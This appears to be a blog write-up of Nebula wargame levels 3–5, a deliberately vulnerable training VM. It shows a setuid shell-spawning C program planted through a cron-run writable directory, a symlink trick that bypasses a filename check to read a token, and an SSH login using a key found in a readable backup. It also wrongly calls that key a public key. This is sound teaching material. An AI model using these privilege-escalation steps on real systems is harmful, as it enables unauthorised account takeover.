---
title: "Writeup: nebula (level 3 - level 5)"
date: 2020-12-18T12:06:53+08:00
draft: false
---

Nebula is a virtual machine that covers a variety of challenges about Linux privilege escalation, scripting language issues, and file system race conditions. It is available at [Exploit Exercises](https://exploit-exercises.lains.space/).

<br>

## Level 3

The description of Level 3 is provided as follows. 

```
Check the home directory of flag03 and take note of the files there.

There is a crontab that is called every couple of minutes.

To do this level, log in as the level03 account with the password level03. 
Files for this level can be found in /home/flag03.
```

As you can see, there are one shell script and one directory in /home/flag03. 

![](https://github.com/chuang76/image/blob/master/03-1.PNG?raw=true)

Let's check the contents of writable.sh. It runs each file in the directory writable.d. 

```
#!/bin/sh
for i in /home/flag03/writable.d/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

According to the hint, there is a crontab in the system. [Cron](https://en.wikipedia.org/wiki/Cron) (cron job) is a time-based job scheduler in Unix-based systems. It provides the user to run the jobs (commands or shell scripts) at fixed times. Its configure table, crontab (cron table), is used to specify the shell command to run periodically on a given schedule. We can check the contents of crontab in /etc directory. 

![](https://github.com/chuang76/image/blob/master/03-6.PNG?raw=true)

Let's check the cron mechanism with a simple experiment. Create a shell script in the writable.d while the shell script is going to create a file named "test" in /home/flag03. As you can see, after two minutes, a file named "test" was created in /home/flag03 indeed. 

![](https://github.com/chuang76/image/blob/master/03-2.PNG?raw=true)

So, to get the flag, we can create a shell script again, which executes our exploit program, in the writable.d. Since /tmp directory is world-writable. We can write our exploit program and compile it in /tmp. It is the same as the exploit program in [Level 1](https://chuang76.github.io/posts/nebula_p1/). 

```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char** argv)
{
    gid_t gid = getegid();
    uid_t uid = geteuid();

    setresgid(gid, gid, gid);
    setresuid(uid, uid, uid);

    system("/bin/bash");
}
```

![](https://github.com/chuang76/image/blob/master/03-3.PNG?raw=true)

Also, the shell script named run.sh contains the following commands. 

```
cp /tmp/vul /home/flag03/vul 
chmod u+s /home/flag03/vul
```

After a couple of minutes, cron runs the jobs (include shell scripts) in the system. Therefore, an executable named `vul` exists in /home/flag03. Besides, due to chmod command previously executed, we have the permission to run vul. 

![](https://github.com/chuang76/image/blob/master/03-4.PNG?raw=true)

Now, let's run this exploit executable to control the bash of the account flag03. 

![](https://github.com/chuang76/image/blob/master/03-5.PNG?raw=true)

<br>

## Level 4

The description of Level 4 is provided as follows.

```
This level requires you to read the token file, but the code restricts the files 
that can be read. Find a way to bypass it :)

To do this level, log in as the level04 account with the password level04. 
Files for this level can be found in /home/flag04.
```

The source code is available. 

```
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>

int main(int argc, char **argv, char **envp)
{
      char buf[1024];
      int fd, rc;

      if(argc == 1) {
          printf("%s [file to read]\n", argv[0]);
          exit(EXIT_FAILURE);
      }

      if(strstr(argv[1], "token") != NULL) {
          printf("You may not access '%s'\n", argv[1]);
          exit(EXIT_FAILURE);
      }

      fd = open(argv[1], O_RDONLY);
      if(fd == -1) {
          err(EXIT_FAILURE, "Unable to open %s", argv[1]);
      }

      rc = read(fd, buf, sizeof(buf));

      if(rc == -1) {
          err(EXIT_FAILURE, "Unable to read fd %d", fd);
      }

      write(1, buf, rc);
}
```

According to the source code, if we use "token" as the argument of flag04, we'll get the error message: You may not access token. However, we can perform an indirect way to view the contents of a restricted file. That is, create a symbolic link of the file token. 

```
$ ln -s [target] [target_symbolic]
```

![](https://github.com/chuang76/image/blob/master/04-1.PNG?raw=true)

After we have made the symbolic link, we can execute target_symbolic file, just as we could with the target file. Now, we can read the contents of token as follows. 

![](https://github.com/chuang76/image/blob/master/04-2.PNG?raw=true)

Use the token as the password of account flag04, then we can get the flag. 

![](https://github.com/chuang76/image/blob/master/04-3.PNG?raw=true)

<br>

## Level 5

The description of Level 5 is provided as follows.

```
Check the flag05 home directory. You are looking for weak directory permissions

To do this level, log in as the level05 account with the password level05. 
Files for this level can be found in /home/flag05.
```

We first check the contents in the directory /home/flag05. 

![](https://github.com/chuang76/image/blob/master/05-1.PNG?raw=true)

There is a compressed file in the directory .backup. Let's try to uncompress it. However, the error message indicates that we don't have the permission. 

![](https://github.com/chuang76/image/blob/master/05-2.PNG?raw=true)

To get rid of the permission issue, let's copy this file into /tmp directory. 

![](https://github.com/chuang76/image/blob/master/05-3.PNG?raw=true)

Now, we are able to uncompress the compressed file with tar command. 

![](https://github.com/chuang76/image/blob/master/05-4.PNG?raw=true)

After uncompressing the file, we obtain the public key, which helps us to log into a remotely as account flag05. [SSH](https://en.wikipedia.org/wiki/SSH_(Secure_Shell)) (Secure shell) is a cryptographic network protocol. It provides users to control the remote servers over the Internet, such as login, remote command-line, to name a few. 

Since SSH uses [public-key cryptography](https://en.wikipedia.org/wiki/Public-key_cryptography) to authenticate and now we have the public key, we are allowed to log in remotely as the account flag05 without any passwords. Let's try it via ssh command. 

```
$ ssh flag05@localhost
```

As you can see, we log in as the account flag05. 

![](https://github.com/chuang76/image/blob/master/05-5.PNG?raw=true)

Here is the flag. 

![](https://github.com/chuang76/image/blob/master/05-6.PNG?raw=true)





